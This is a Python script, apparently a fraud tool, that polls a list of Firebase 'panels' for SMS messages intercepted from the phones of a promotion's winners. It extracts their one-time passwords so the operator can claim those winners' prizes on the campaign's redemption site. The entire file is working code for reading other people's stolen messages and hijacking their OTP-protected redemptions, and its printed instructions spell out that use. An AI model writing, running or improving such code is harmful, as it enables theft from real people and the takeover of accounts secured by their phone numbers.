#!/usr/bin/env python3
"""
Cremica Campaign - Today's Winners Live OTP Monitor.
Monitors ALL 87 numbers that won TODAY (2026-09-01) for incoming claim OTPs in real-time.
"""

import sys
import os
import re
import time
import requests
import base64
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Fix Windows console UTF-8 output encoding
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

PANELS_FILE = "panels.txt"
WINNERS_MASTER_FILE = "cremica_exact_bector_winners.txt"
TODAY_DATE = "2026-09-01"

def parse_firebase_link(link: str):
    if not link:
        return None
    link = link.strip()
    if not link.startswith(("http://", "https://")):
        link = "https://" + link

    parsed = urlparse(link)
    qs = parse_qs(parsed.query)
    encoded_s = qs.get("s", [None])[0]
    if encoded_s:
        try:
            encoded_clean = encoded_s + "=" * (-len(encoded_s) % 4)
            decoded = base64.b64decode(encoded_clean).decode("utf-8", errors="ignore").split("|")[0].strip()
            if "firebaseio.com" in decoded or "firebasedatabase.app" in decoded:
                if not decoded.startswith(("http://", "https://")):
                    decoded = "https://" + decoded
                return decoded.rstrip("/") + "/"
        except Exception:
            pass

    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return base_url.rstrip("/") + "/"

    return None

def load_panel_urls():
    urls = []
    if os.path.exists(PANELS_FILE):
        with open(PANELS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_firebase_link(line)
                if p:
                    urls.append(p)
    return urls

def extract_todays_winner_numbers():
    todays_numbers = set()
    if os.path.exists(WINNERS_MASTER_FILE):
        with open(WINNERS_MASTER_FILE, "r", encoding="utf-8") as f:
            text = f.read()
            for block in text.split("-----------------------------------------------------------------"):
                if TODAY_DATE in block:
                    phone_match = re.search(r"Phone:\s*([6-9]\d{9})", block)
                    if phone_match:
                        todays_numbers.add(phone_match.group(1))
    return todays_numbers

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "application/json"
}

def scan_panel_for_winners(panel_url, winning_numbers):
    found = []
    try:
        url = panel_url.rstrip("/") + "/messages.json"
        resp = requests.get(url, headers=headers, timeout=6)
        if resp.status_code == 200:
            data = resp.json() or {}
            if isinstance(data, dict):
                for cid, device_msgs in data.items():
                    if not isinstance(device_msgs, dict):
                        continue

                    # Check client phone
                    client_phone = None
                    for m in device_msgs.values():
                        if isinstance(m, dict):
                            t = str(m.get("body") or m.get("message") or m.get("text") or "")
                            m_phone = re.search(r"\b([6-9]\d{9})\b", t)
                            if m_phone:
                                client_phone = m_phone.group(1)
                                break

                    if client_phone and client_phone in winning_numbers:
                        for mid, mdata in device_msgs.items():
                            if not isinstance(mdata, dict):
                                continue
                            body = str(mdata.get("body") or mdata.get("message") or mdata.get("text") or "")
                            if not body:
                                continue

                            sender = str(mdata.get("sender") or mdata.get("address") or mdata.get("from") or "Unknown")
                            ts_str = "Unknown"
                            ts_val = 0
                            try:
                                ts_val = int(mid) / 1000
                                ts_str = datetime.fromtimestamp(ts_val).strftime("%Y-%m-%d %H:%M:%S")
                            except Exception:
                                pass

                            otp_match = re.search(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
                            otp = otp_match.group(1) if otp_match else "N/A"

                            found.append({
                                "phone": client_phone,
                                "msg_id": mid,
                                "sender": sender,
                                "body": body,
                                "otp": otp,
                                "time": ts_str,
                                "ts_val": ts_val,
                                "panel": panel_url
                            })
    except Exception:
        pass
    return found

def main():
    todays_winners = extract_todays_winner_numbers()
    panel_urls = load_panel_urls()

    print("=" * 75)
    print(f"🔥 CREMICA TODAY'S WINNERS ({TODAY_DATE}) - LIVE OTP MONITOR 🔥")
    print("=" * 75)
    print(f"📌 Monitoring {len(todays_winners)} winning numbers across {len(panel_urls)} Firebase panels...")

    if not todays_winners:
        print("❌ No winning numbers found for today in cremica_exact_bector_winners.txt!")
        return

    def poll_all_panels():
        all_msgs = []
        with ThreadPoolExecutor(max_workers=25) as executor:
            futures = [executor.submit(scan_panel_for_winners, u, todays_winners) for u in panel_urls]
            for f in as_completed(futures):
                all_msgs.extend(f.result())
        all_msgs.sort(key=lambda x: (x["ts_val"], str(x["msg_id"])), reverse=True)
        return all_msgs

    print("🔄 Initializing initial message cache...")
    initial_msgs = poll_all_panels()

    seen_msg_ids = set()
    for m in initial_msgs:
        seen_msg_ids.add(m["msg_id"])

    print("\n" + "=" * 75)
    print("⚡ RECENT OTPs FOR TODAY'S WINNERS:")
    print("=" * 75)

    recent_otps = [m for m in initial_msgs if m["otp"] != "N/A"]
    if recent_otps:
        for idx, m in enumerate(recent_otps[:15], 1):
            print(f"{idx:02d}. Phone: {m['phone']}  ==>  🔑 OTP: [ {m['otp']} ] | Time: {m['time']}")
            print(f"    Message: {m['body']}")
            print("-" * 65)
    else:
        print("No recent OTPs found yet.")

    print("\n🟢 LIVE MONITORING IS ACTIVE!")
    print("👉 When you request an OTP on https://cremicabacktoschool.woohoo.in/redemption for ANY today winner, it will pop up below INSTANTLY!")
    print("Press Ctrl+C to exit.\n")

    try:
        while True:
            time.sleep(1.5)
            latest_msgs = poll_all_panels()
            for m in latest_msgs:
                if m["msg_id"] not in seen_msg_ids:
                    seen_msg_ids.add(m["msg_id"])
                    print("=" * 75)
                    print(f"🎉 NEW CLAIM OTP RECEIVED FOR TODAY'S WINNER! 🎉")
                    print(f"📱 PHONE NUMBER:  >>>>  {m['phone']}  <<<<")
                    print(f"🔑 OTP CODE:      >>>>  {m['otp']}  <<<<")
                    print(f"⏰ Time: {m['time']} | Sender: {m['sender']}")
                    print(f"💬 Message: {m['body']}")
                    print("=" * 75 + "\n")
    except KeyboardInterrupt:
        print("\nMonitoring stopped.")

if __name__ == "__main__":
    main()
